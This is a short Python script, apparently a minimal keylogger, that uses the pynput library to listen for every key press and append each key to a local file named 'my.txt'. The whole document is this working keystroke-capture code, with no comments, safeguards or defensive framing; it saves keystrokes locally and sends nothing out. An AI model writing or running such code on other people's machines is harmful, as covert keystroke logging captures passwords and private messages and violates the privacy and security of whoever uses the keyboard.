import pynput.keyboard

def logger(key):
    with open("my.txt","a") as ls:
        ls.write(str(key))

keystrokes = pynput.keyboard.Listener(on_press=logger)
with keystrokes :
    keystrokes.join()
